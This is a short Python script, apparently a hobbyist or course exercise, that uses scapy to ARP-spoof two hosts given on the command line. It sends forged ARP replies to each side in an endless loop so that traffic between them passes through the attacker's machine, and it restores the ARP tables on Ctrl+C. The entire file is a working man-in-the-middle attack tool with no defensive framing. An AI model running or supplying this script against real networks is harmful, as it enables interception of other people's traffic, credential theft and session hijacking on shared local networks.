import scapy.all as scapy
import argparse

def options():
    parser= argparse.ArgumentParser()
    parser.add_argument("-t","--target", dest="target", help="Set Target IP")
    parser.add_argument("-s","--spoof", dest="spoof", help="Spoofing IP")
    return parser.parse_args()

def get_mac(ip):
    answered_l=scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip),timeout=2,verbose=False)[0]
    return answered_l[0][1].hwsrc
def spoof(target, spoof):
    target_mac=get_mac(target)
    packet=scapy.ARP(op=2,pdst=target,hwdst=target_mac,psrc=spoof)
    scapy.send(packet, verbose=False, count=2)

def restore(target, spoof):
    target_mac=get_mac(target)
    spoof_mac=get_mac(spoof)
    packet=scapy.ARP(op=2,pdst=target,hwdst=target_mac,psrc=spoof,hwsrc=spoof_mac)
    scapy.send(packet, verbose=False, count=5)

option=options()
try:
    while True:
        spoof(option.target, option.spoof)
        spoof(option.spoof, option.target)
        print ("[+] Spoofing The Target : ",option.target)
except KeyboardInterrupt:
    print ("Ctrl + C is detected")
    restore(option.target,option.spoof)
    print ("Please wait!! Restoring ARP table to default")
    print ("Exiting.......")

